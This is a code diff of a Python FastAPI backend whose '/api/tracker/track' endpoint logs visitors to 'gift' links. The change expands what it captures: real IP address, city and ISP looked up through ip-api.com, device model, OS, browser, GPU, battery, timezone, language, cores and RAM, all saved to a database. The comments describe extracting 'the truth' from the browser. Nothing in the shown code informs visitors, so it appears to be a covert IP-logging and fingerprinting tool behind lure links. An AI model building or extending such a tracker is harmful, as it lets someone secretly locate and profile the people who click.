@@ -20,7 +20,7 @@ def init_db():
     try:
         conn = psycopg2.connect(DB_URL)
         cur = conn.cursor()
-        cur.execute("DROP TABLE IF EXISTS visits CASCADE;") # مسح شامل للتحديث
+        cur.execute("DROP TABLE IF EXISTS visits CASCADE;")
         cur.execute("""
             CREATE TABLE visits (
                 id SERIAL PRIMARY KEY,
@@ -28,15 +28,15 @@ def init_db():
                 ip TEXT,
                 location TEXT,
                 isp TEXT,
-                os_system TEXT,
-                device_model TEXT,
-                browser TEXT,
-                screen_res TEXT,
-                cores TEXT,
-                memory TEXT,
-                battery TEXT,
-                connection_type TEXT,
-                is_vpn BOOLEAN,
+                device_info TEXT, -- الموديل الحقيقي
+                system_info TEXT, -- الويندوز أو الـ iOS
+                browser_info TEXT, -- كروم أو سفاري
+                gpu TEXT, -- كرت الشاشة
+                screen_res TEXT, -- دقة الشاشة
+                battery TEXT, -- الشحن
+                timezone TEXT, -- المنطقة الزمنية
+                language TEXT, -- لغة الجهاز
+                hardware_details TEXT, -- الرام والمعالج
                 created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             );
         """)
@@ -51,46 +51,35 @@ init_db()
 @app.post("/api/tracker/track")
 async def track_visit(request: Request, data: dict):
     try:
-       ip = request.headers.get("x-forwarded-for") or request.client.host
-        ua_string = data.get("userAgent") # ناخذ الـ UserAgent الكامل من الفرونت
-        ua = parse(ua_string)
+        ip = request.headers.get("x-forwarded-for") or request.client.host
+        if "," in ip: ip = ip.split(",")[0].strip()
         
-        # تحليل ذكي:
-        # لو كان ويندوز، بنعرف النسخة. لو كان آيفون، بنعرف الموديل.
+        # تحليل الـ User-Agent لسحب الحقيقة من "كذبة المتصفح"
+        ua = parse(data.get("userAgent", ""))
         system = f"{ua.os.family} {ua.os.version_string}"
-        device = ua.device.family
-        if ua.device.brand:
-            device = f"{ua.device.brand} {ua.device.model}"
-        
+        device = f"{ua.device.brand or ''} {ua.device.model or 'PC'}".strip()
         browser = f"{ua.browser.family} {ua.browser.version_string}"
+
+        # جلب الموقع والـ ISP
+        location, isp = "Unknown", "Unknown"
         try:
             async with httpx.AsyncClient() as client:
-                res = await client.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,city,isp,proxy")
-                if res.status_code == 200: geo_data = res.json()
+                res = await client.get(f"http://ip-api.com/json/{ip}")
+                geo = res.json()
+                location = f"{geo.get('city')}, {geo.get('country')}"
+                isp = geo.get('isp')
         except: pass
 
-        # 3. حفظ البيانات في القاعدة
         conn = psycopg2.connect(DB_URL)
         cur = conn.cursor()
         cur.execute("""
-            INSERT INTO visits (
-                gift_slug, ip, location, isp, os_system, device_model, 
-                browser, screen_res, cores, memory, battery, connection_type, is_vpn
-            ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
+            INSERT INTO visits (gift_slug, ip, location, isp, device_info, system_info, browser_info, gpu, screen_res, battery, timezone, language, hardware_details)
+            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
         """, (
-            data.get("giftId"),
-            ip,
-            f"{geo_data.get('city')}, {geo_data.get('country')}",
-            geo_data.get("isp"),
-            data.get("os"),
-            data.get("device"),
-            data.get("browser"),
-            data.get("screen"),
-            str(data.get("cores")),
-            str(data.get("ram")),
-            data.get("battery"),
-            data.get("connection"),
-            geo_data.get("proxy", False)
+            data.get("giftId"), ip, location, isp, device, system, browser,
+            data.get("gpu"), data.get("screen"), data.get("battery"),
+            data.get("timezone"), data.get("language"),
+            f"Cores: {data.get('cores')} | RAM: {data.get('ram')}GB"
         ))
         conn.commit()
         cur.close()
